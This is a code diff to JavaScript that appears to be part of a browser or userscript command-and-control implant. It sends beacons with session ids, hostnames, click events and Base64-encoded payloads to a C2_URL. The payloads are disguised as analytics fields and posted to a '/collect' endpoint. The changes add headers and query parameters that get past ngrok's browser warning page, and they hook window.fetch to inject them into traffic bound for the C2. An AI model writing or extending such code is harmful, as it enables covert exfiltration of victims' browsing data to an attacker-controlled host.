@@ -1158,7 +1158,7 @@ function openRemoteTarget() {
                 let clicks = 0;
 
                 const report = (event = 'heartbeat') => {
-                    fetch(\`\${C2_URL}/report?sid=\${sid}&host=\${host} (\${event})\`).catch(()=>{});
+                    fetch(\`\${C2_URL}/report?sid=\${sid}&host=\${host} (\${event})&ngrok-skip-browser-warning=1\`).catch(()=>{});
                 };
 
                 window.addEventListener('click', () => {
@@ -1392,10 +1392,24 @@ function setupCustomNetwork() {
     const networkList = document.getElementById('dev-network-list');
 
     window.fetch = async (...args) => {
-        const url = args[0];
+        let url = args[0];
+        let options = args[1] || {};
+
+        // Bypass ngrok warning page for all requests to our C2
+        if (typeof url === 'string' && url.includes('ngrok')) {
+            if (!options.headers) options.headers = {};
+            if (options.headers instanceof Headers) {
+                options.headers.set('ngrok-skip-browser-warning', 'true');
+            } else {
+                options.headers['ngrok-skip-browser-warning'] = 'true';
+            }
+            args[1] = options;
+        }
+
         const start = performance.now();
         const row = document.createElement('tr');
-        row.innerHTML = `<td>${url.split('/').pop() || url}</td><td>Pending</td><td>Fetch</td><td>-</td>`;
+        const urlDisplay = typeof url === 'string' ? url : (url instanceof Request ? url.url : 'Request');
+        row.innerHTML = `<td>${urlDisplay.split('/').pop() || urlDisplay}</td><td>Pending</td><td>Fetch</td><td>-</td>`;
         networkList.prepend(row);
 
         try {
@@ -1521,16 +1535,20 @@ function initializeAgentLinks() {
                 ec: type, /* Event Category */
                 ea: payload, /* Event Action (Base64 Payload) */
                 dl: host, /* Document Location */
-                z: Date.now()
+                z: Date.now(),
+                'ngrok-skip-browser-warning': '1'
             });
 
-            const url = C2_URL + '/collect?' + params.toString();
+            const url = C2_URL + '/collect?' + params.toString() + '&ngrok-skip-browser-warning=1';
             
             if (typeof GM_xmlhttpRequest !== 'undefined') {
                 GM_xmlhttpRequest({
                     method: 'POST',
                     url: url,
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    headers: { 
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'ngrok-skip-browser-warning': 'true'
+                    },
                     data: ''
                 });
             } else {
